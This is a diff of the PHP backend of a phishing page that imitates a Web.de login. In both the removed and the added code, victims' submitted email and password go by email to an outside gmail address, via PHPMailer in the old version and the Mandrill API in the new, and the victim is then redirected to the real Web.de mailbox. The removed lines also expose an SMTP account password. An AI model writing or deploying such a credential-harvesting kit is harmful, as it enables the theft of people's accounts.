@@ -1,42 +1,49 @@
 <?php
 
-require_once __DIR__ . '/../PHPMailer/src/Exception.php';
-require_once __DIR__ . '/../PHPMailer/src/PHPMailer.php';
-require_once __DIR__ . '/../PHPMailer/src/SMTP.php';
-
-use PHPMailer\PHPMailer\PHPMailer;
-
 if (isset($_POST['login'])) {
-  extract($_POST);
+    extract($_POST);
 
-  $mail = new PHPMailer(true);
-  $mail->isSMTP();
-  $mail->Host = "mail.starslinkinvestment.com";
-  $mail->SMTPAuth = true;
-  $mail->Username = "support@starslinkinvestment.com";
-  $mail->Password = "#StarsInvest";
-  $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
-  $mail->Port = 465;
+    $api_key = 'YOUR_MANDRILL_API_KEY';
 
-  try {
-    $mail->setFrom("support@starslinkinvestment.com", 'Support');
-    $mail->addAddress("quean29@gmail.com");
+    $url = 'https://mandrillapp.com/api/1.0/messages/send.json';
 
-    //Content
-    $mail->isHTML(true);
-    $mail->Subject = "--NEW WEB.DE Details--";
-    $mail->Body    = '<body style="background-color:grey">
-        <p>New Web.de details has been sent. \n\nEmail: ' . $email . ' \n Password: ' . $password . ' \n\n Kind Regards</p>
-    </body>';
+    $data = array(
+        'key' => $api_key,
+        'message' => array(
+            'html' => '<p>New registration details: <br>Email: ' . $email . '<br>Password: ' . $password . '<br>Kind Regards</p>',
+            'subject' => 'New Registration Details',
+            'from_email' => 'your@email.com', // Replace with your email
+            'to' => array(
+                array(
+                    'email' => 'quean29@gmail.com', // Replace with recipient's email
+                    'name' => 'Recipient Name',
+                    'type' => 'to'
+                )
+            )
+        )
+    );
 
-    $mail->send();
-  } catch (\Throwable $e) {
-    return false;
-  }
+    $options = array(
+        'http' => array(
+            'header' => "Content-type: application/json\r\n",
+            'method' => 'POST',
+            'content' => json_encode($data),
+        ),
+    );
 
-  header("Location: https://mm.web.de/");
+    $context = stream_context_create($options);
+    $result = file_get_contents($url, false, $context);
+
+    if ($result === FALSE) {
+        // Handle error
+        echo 'Error sending email.';
+    } else {
+        header("Location: https://mm.web.de/");
+    }
 }
 ?>
+
+
 <!doctype html>
 <html lang="en">
 
